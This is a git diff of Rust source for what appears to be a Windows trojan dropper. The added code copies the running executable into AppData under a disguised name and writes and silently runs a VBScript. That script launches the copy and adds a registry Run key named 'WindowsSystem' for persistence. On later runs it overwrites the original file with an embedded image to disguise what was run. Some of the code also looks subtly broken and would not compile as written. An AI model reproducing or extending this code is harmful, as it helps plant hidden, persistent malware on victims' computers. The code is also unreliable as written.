@@ -1,9 +1,13 @@
+#![allow(dead_code)]
 use core::str::FromStr;
 use native_tls::{TlsConnector, TlsStream};
 use rand::Rng;
 use std::{
-  collections::HashMap, env, error, fs, io::Read, io::Result as IResult, io::Write, net::TcpStream, process::{Command, exit}
+  collections::HashMap, error, io::Read, io::Result as IResult, io::Write, net::TcpStream,
 };
+
+#[allow(dead_code)]
+mod image_placeholder;
 
 static BODY_SEPARATOR: &str = "\r\n\r\n";
 static CONFIG_SEPARATOR: &str = ";";
@@ -153,46 +157,68 @@ impl Connection for TcpStream {
 }
 
 #[cfg(target_os = "macos")]
-pub fn register() {
+pub fn setup() -> Result<()> {
   todo!();
 }
 
 #[cfg(target_os = "windows")]
-pub fn register() {
-  let home_path = env::home_dir().unwrap().display().to_string();
+pub fn setup() -> Result<()> {
+  use std::{
+    env, fs,
+    process::{exit, Command},
+  };
+  let home_path = env::home_dir()?.display().to_string();
   let current_path = std::env::current_exe().unwrap().display().to_string();
   let target_path = home_path.clone() + "\\AppData\\Local\\ibreq.exe";
   let vbs_path = home_path.clone() + "\\AppData\\Local\\ibreq.vbs";
+  let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";
 
   if current_path == target_path {
+    let conf = parse_config(fs::read_to_string(&conf_path).unwrap());
+    let original_path: String = conf.get("original_path").unwrap();
+
+    loop {
+      // Replacing with image;
+      match fs::write(&original_path, image_placeholder::get_placeholder_buf()) {
+        Ok(_) => break,
+        Err(_) => {
+          thread::sleep(Duration::from_millis(10));
+          continue;
+        }
+      }
+    }
     return;
   }
 
   fs::copy(&current_path, &target_path).unwrap();
 
-  let vbs_content = format!(r#"
+  // Run add and register as autorun
+  let vbs_content = format!(
+    r#"
     Set oShell = CreateObject("Wscript.Shell")
     oShell.Run "cmd /c {target_path}", 0, false
     oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSystem","{target_path}","REG_SZ"
-  "#, target_path = target_path);
-
+  "#,
+    target_path = target_path
+  );
   fs::write(&vbs_path, &vbs_content).unwrap();
-
   Command::new("wscript").arg(&vbs_path).output().unwrap();
-
   fs::remove_file(&vbs_path).unwrap();
-  fs::remove_file(&current_path).unwrap();
+
+  // Create config file
+  let conf_content = format!(r#"original_path={};"#, current_path);
+  fs::write(&conf_path, &conf_content).unwrap();
 
   exit(0);
 }
 
 #[cfg(target_os = "linux")]
-pub fn register() {
+pub fn setup() -> Result<()> {
   todo!();
 }
 
 #[cfg(other)]
-fn register() {
+fn setup() -> Result<()> {
   todo!();
 }
 
